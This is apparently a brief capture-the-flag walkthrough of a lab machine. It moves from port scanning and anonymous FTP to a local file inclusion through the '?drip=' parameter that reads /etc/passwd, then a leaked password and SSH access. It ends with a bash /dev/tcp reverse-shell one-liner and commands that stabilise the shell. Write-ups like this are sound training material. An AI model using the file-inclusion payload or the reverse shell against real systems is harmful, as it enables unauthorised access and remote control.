Nmap scan shows 3 open ports, ftp has anonymous, ssh and a web server on port 80.
There is a robots txt disallowing several text files.

Looks like there is some kind of LFI in index.php, lets find the parameter with ffuf. its ?drip=/etc/passwd
We try to read the file in robots.txt again and in the source code we get a password... lets try to login, ssh logs us in and also in the GUI.

bash -c 'bash - >& /dev/tcp/192.168.56.1/9001 0>&1'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo;fg
reset
echo TERM=xterm
